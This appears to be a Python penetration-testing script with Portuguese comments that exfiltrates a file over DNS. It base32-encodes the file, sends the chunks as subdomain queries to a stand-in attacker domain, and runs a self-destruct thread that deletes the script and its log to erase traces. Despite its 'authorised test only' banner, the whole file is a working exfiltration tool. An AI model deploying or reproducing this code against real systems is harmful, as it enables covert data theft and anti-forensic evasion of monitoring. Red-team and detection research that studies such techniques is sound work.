import base64
import socket
import time
import os
import logging
import threading
import argparse
import uuid
import dns.resolver  # Requer dnspython (pip install dnspython)

############### Configurações do pentester (padrões, podem ser sobrescritos via CLI)
DNS_SERVER = "8.8.8.8"
ATTACKER_DOMAIN = "attacker.example.com"
FILE_TO_EXFIL = "dados_teste.txt"
CHUNK_SIZE = 20
AUTO_DELETE = True
TIMEOUT_SECONDS = 180
LOG_FILE = "dns_exfiltration.log"

############################## Configuração de logging
logging.basicConfig(filename=LOG_FILE, level=logging.INFO, format='%(asctime)s - %(message)s')

# Gera identificador de sessão
SESSION_ID = str(uuid.uuid4())[:8]

# CLI Argumentos
parser = argparse.ArgumentParser(description="Simula exfiltração de dados via DNS")
parser.add_argument("--file", default=FILE_TO_EXFIL, help="Arquivo para exfiltrar")
parser.add_argument("--domain", default=ATTACKER_DOMAIN, help="Domínio do atacante")
parser.add_argument("--dns", default=DNS_SERVER, help="Servidor DNS a ser usado")
args = parser.parse_args()

print("\n⚠️  ESTE SCRIPT DEVE SER USADO APENAS EM AMBIENTE DE TESTE AUTORIZADO ⚠️\n")
logging.info(f"==== Início da sessão de exfiltração | ID: {SESSION_ID} ====")


def send_dns_query(data_chunk):
    """
    Envia uma consulta DNS com o chunk de dados para o domínio controlado.
    """
    try:
        query = f"{data_chunk}.{args.domain}"
        logging.info(f"[{SESSION_ID}] Enviando chunk: {query}")
        resolver = dns.resolver.Resolver()
        resolver.nameservers = [args.dns]
        resolver.resolve(query, "A")
    except Exception as e:
        logging.error(f"[{SESSION_ID}] Erro na consulta DNS: {e}")


def read_and_chunk_file(file_path):
    """
    Lê o conteúdo de um arquivo e divide em chunks base64.
    """
    if not os.path.exists(file_path):
        logging.error(f"Arquivo não encontrado: {file_path}")
        return []

    with open(file_path, "rb") as f:
        encoded_data = base64.b32encode(f.read()).decode("utf-8").strip()

    chunks = [encoded_data[i:i+CHUNK_SIZE] for i in range(0, len(encoded_data), CHUNK_SIZE)]
    return chunks


def auto_self_destruct(timeout=TIMEOUT_SECONDS):
    """
    Encerra o processo após o tempo limite e remove o script e logs.
    """
    time.sleep(timeout)
    logging.info(f"[{SESSION_ID}] Tempo limite alcançado. Autodestruição iniciada.")
    try:
        if AUTO_DELETE:
            os.remove(__file__)
            os.remove(LOG_FILE)
            logging.info(f"[{SESSION_ID}] Script e logs removidos.")
    except Exception as e:
        logging.error(f"[{SESSION_ID}] Erro na autodestruição: {e}")
    os._exit(0)


def main():
    logging.info(f"[{SESSION_ID}] Início da exfiltração via DNS.")
    chunks = read_and_chunk_file(args.file)
    for chunk in chunks:
        send_dns_query(chunk)
        time.sleep(1)
    logging.info(f"[{SESSION_ID}] Exfiltração concluída.")


if __name__ == "__main__":
    threading.Thread(target=auto_self_destruct).start()
    main()
